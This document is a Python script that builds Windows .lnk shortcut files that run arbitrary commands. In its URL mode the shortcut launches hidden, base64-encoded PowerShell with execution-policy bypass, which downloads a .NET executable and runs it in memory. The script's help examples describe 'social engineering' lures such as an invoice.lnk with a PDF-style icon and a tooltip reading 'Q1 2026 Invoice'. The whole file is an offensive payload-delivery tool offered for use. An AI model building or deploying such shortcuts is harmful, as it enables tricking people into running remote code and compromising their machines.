#!/usr/bin/env python3

import argparse
import base64
import struct
import sys

try:
    import pylnk3
except ImportError:
    print("[-] Missing pylnk3. Install: pip install pylnk3", file=sys.stderr)
    sys.exit(1)


def patch_idlist_shell_items(lnk_path: str):
    with open(lnk_path, 'rb') as f:
        data = bytearray(f.read())

    idlist_size = struct.unpack('<H', data[76:78])[0]
    items = []
    off = 78
    end = 76 + 2 + idlist_size
    while off < end:
        sz = struct.unpack('<H', data[off:off+2])[0]
        if sz == 0:
            break
        items.append((off, sz))
        off += sz

    path_segs = [i for i in items if data[i[0]+2] in (0x31, 0x32)]
    if not path_segs:
        return

    for i, (item_off, item_sz) in enumerate(path_segs):
        is_last = (i == len(path_segs) - 1)
        if is_last:
            data[item_off + 2] = 0x32
            if item_sz >= 14:
                data[item_off + 12] = 0x20
                data[item_off + 13] = 0x00
        else:
            data[item_off + 2] = 0x31
            if item_sz >= 14:
                data[item_off + 12] = 0x10
                data[item_off + 13] = 0x00

    with open(lnk_path, 'wb') as f:
        f.write(data)


CMD_PATH = r"C:\Windows\System32\cmd.exe"
CMD_DIR = r"C:\Windows\System32"
PS_X64_PATH = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS_X64_DIR = r"C:\Windows\System32\WindowsPowerShell\v1.0"
PS_X86_PATH = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
PS_X86_DIR = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0"
DEFAULT_ICON = r"C:\Windows\System32\shell32.dll"
DEFAULT_ICON_INDEX = 3


def build_inmem_ps(url: str) -> str:
    return (
        f"$b=(New-Object Net.WebClient).DownloadData('{url}');"
        f"$a=[Reflection.Assembly]::Load($b);"
        f"$a.EntryPoint.Invoke($null,(,[string[]]@()))"
    )


def encode_ps(script: str) -> str:
    return base64.b64encode(script.encode('utf-16-le')).decode()


def main():
    ap = argparse.ArgumentParser(
        description="Build .lnk shortcut (arbitrary command or in-memory .NET loader)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Run arbitrary command:
    python3 build_lnk.py --cmd "calc.exe" -o calc.lnk

  Run command with args:
    python3 build_lnk.py --cmd "powershell -c whoami > C:\\Users\\Public\\w.txt" -o r.lnk

  Download .exe (from build_loader.py) and run in memory:
    python3 build_lnk.py --url http://192.168.x.x/loader.exe -o update.lnk

  In-memory for x86 Mono-compiled loader:
    python3 build_lnk.py --url http://192.168.x.x/loader.exe --x86 -o update.lnk

  Social engineering (PDF icon, description tooltip):
    python3 build_lnk.py --url http://192.168.x.x/loader.exe -o invoice.lnk \\
        --desc "Q1 2026 Invoice" --icon "C:\\Windows\\System32\\imageres.dll" --icon-index 2
        """,
    )

    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--cmd", help="Arbitrary command to run via cmd.exe /c")
    mode.add_argument("--url",
                      help="URL of .NET .exe to download and run in memory via Reflection.Assembly.Load")

    ap.add_argument("-o", "--output", default="shortcut.lnk", help="Output .lnk path")
    ap.add_argument("--desc", default=None, help="Description / hover tooltip")
    ap.add_argument("--icon", default=DEFAULT_ICON,
                    help=f"Icon file path on target (default: {DEFAULT_ICON})")
    ap.add_argument("--icon-index", type=int, default=DEFAULT_ICON_INDEX,
                    help=f"Icon index (default: {DEFAULT_ICON_INDEX} = folder icon in shell32.dll)")
    ap.add_argument("--window", choices=["Normal", "Minimized", "Maximized"], default="Minimized",
                    help="Window mode (default: Minimized — hides console flash)")
    ap.add_argument("--x86", action="store_true",
                    help="Use 32-bit PowerShell (SysWOW64) for --url mode (x86 .NET assemblies)")

    args = ap.parse_args()

    if args.cmd:
        target = CMD_PATH
        work_dir = CMD_DIR
        arguments = f'/c {args.cmd}'
        print(f"[+] Mode:    command", file=sys.stderr)
        print(f"[+] Command: {args.cmd}", file=sys.stderr)
    else:
        ps_script = build_inmem_ps(args.url)
        enc = encode_ps(ps_script)
        if args.x86:
            target = PS_X86_PATH
            work_dir = PS_X86_DIR
        else:
            target = PS_X64_PATH
            work_dir = PS_X64_DIR
        arguments = f"-w hidden -ep bypass -nop -enc {enc}"
        print(f"[+] Mode:    in-memory (Reflection.Assembly.Load)", file=sys.stderr)
        print(f"[+] URL:     {args.url}", file=sys.stderr)
        print(f"[+] Arch:    {'x86' if args.x86 else 'x64'}", file=sys.stderr)
        print(f"[+] Payload: {len(ps_script)} chars PS -> {len(enc)} chars base64", file=sys.stderr)

    window_mode = {
        "Normal": pylnk3.WINDOW_NORMAL,
        "Minimized": pylnk3.WINDOW_MINIMIZED,
        "Maximized": pylnk3.WINDOW_MAXIMIZED,
    }[args.window]

    print(f"[+] Target:  {target}", file=sys.stderr)
    print(f"[+] Args:    {arguments[:80]}{'...' if len(arguments) > 80 else ''}", file=sys.stderr)
    print(f"[+] Window:  {args.window}", file=sys.stderr)
    print(f"[+] Icon:    {args.icon} (index {args.icon_index})", file=sys.stderr)

    pylnk3.for_file(
        target_file=target,
        lnk_name=args.output,
        arguments=arguments,
        description=args.desc or "",
        icon_file=args.icon,
        icon_index=args.icon_index,
        work_dir=work_dir,
        window_mode=window_mode,
    )

    lnk = pylnk3.parse(args.output)
    lnk.link_flags['HasLinkInfo'] = True
    lnk.link_flags['ForceNoLinkInfo'] = False
    lnk.file_flags['archive'] = True
    lnk.file_size = 289792
    lnk.specify_local_location(target,
                               drive_type='Fixed (Hard disk)',
                               drive_serial=0x12345678,
                               volume_label='')
    lnk.save(args.output)

    patch_idlist_shell_items(args.output)

    print(f"[+] Wrote {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
